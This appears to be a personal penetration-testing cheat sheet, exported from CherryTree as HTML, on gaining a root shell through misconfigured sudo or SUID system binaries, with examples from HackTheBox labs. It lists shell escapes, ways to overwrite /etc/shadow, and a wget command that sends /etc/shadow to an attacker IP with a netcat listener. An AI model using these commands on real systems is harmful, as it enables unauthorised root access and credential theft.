<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>System Binaries</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># System Binaries</h1></strong><br />Creative ways of using the system binaries available on the distro.<br />If you can run any of these commands as root, or they have a SUID or GUID bit, they&#39;re prime targets for getting a root shell.<br /><br />• <a href="https://gtfobins.github.io">https://gtfobins.github.io</a> - Refer here for an excellent list<br /><br /><strong><h2>## more</h2></strong><code><br /></code>Make your shell window as small as possible. <br />This means that when you run <code>more</code>, your shell won&#39;t exit. <br />You&#39;ll have an interactive session, and can run commands<code><br /><br />sudo more /home/user/myfile<br />!/bin/bash</code><br /><br /><strong><h2>## less</h2></strong><code><br /></code>From less you can go into Vi, and then into a shell.<code><br />sudo less /etc/shadow<br />v<br />:shell</code><br /><br /><strong><h2>## awk</h2></strong><br /><code>awk &#39;BEGIN {system(&quot;/bin/bash&quot;)}&#39;</code><br /><br /><strong><h2>## cp</h2></strong><br />Copy and overwrite <code>/etc/shadow</code><br /><br /><strong><h2>## mv</h2></strong><code><br /></code>Overwrite <code>/etc/shadow</code> or <code>/etc/sudoers</code><br /><br /><strong><h2>## find</h2></strong><br /><code>sudo find / -exec bash -i \;<br /><br />find / -exec /usr/bin/awk &#39;BEGIN {system(&quot;/bin/bash&quot;)}&#39; ;</code><br /><br /><strong><h2>## Vi and Vim</h2></strong><code><br /></code>Can be abused like this:<code><br />sudo vi<br />:shell<br />:set shell=/bin/bash:shell<br />:!bash</code><br /><br /><strong><h2>## curl</h2></strong><br />Can read files on a system, as well as URLs<br /><br /><strong><h3>### Example from hackthebox Curling</h3></strong><br />◇ <code>curl file:///etc/passwd</code> or <code>curl --url = &#39;file:///etc/passwd&#39;</code><br />◇ write a file to the system by ‘uploading’ - <code>curl -T &lt;file to upload&gt; &lt;file to write to&gt;</code><br /><br /><strong><h2>## wget</h2></strong><br /><a href="https://gtfobins.github.io/gtfobins/wget/">https://gtfobins.github.io/gtfobins/wget/</a><br /><br />wget can be used to, effectively, read and write system files.<br /><br /><strong>Examples</strong><br />• hackthebox Sunday<br /><br /><strong>Download/read files</strong><br />Attacker - <code>nc -lvnp 8000 &gt; shadow.txt</code><br />Target - <code>sudo wget --post-file=/etc/shadow </code><a href="http://10.10.14.12:8000/">http://10.10.14.12:8000/</a><br />Attacker - Ctrl+C to finish receiving file<br /><br /><strong>Upload/write files</strong><br />Attacker - <code>python -m SimpleHTTPServer</code><br />Target - <code>sudo wget http://10.10.14.12:8000/shadow -O /etc/shadow</code><br /><br /><strong><h2>## tar</h2></strong><br /><code>tar xf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash</code><br /><br /><strong><h2>## nano</h2></strong><br /><a href="https://gtfobins.github.io/gtfobins/nano/">https://gtfobins.github.io/gtfobins/nano/</a><br /><br /><strong>Examples</strong><br />• hackthebox OpenAdmin<br /><br />CTRL+R to read a file,<br />CTRL+X to execute a command,<br />type <code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code> to spawn a shell.<br /><br /><br /></div>
</body>
</html>
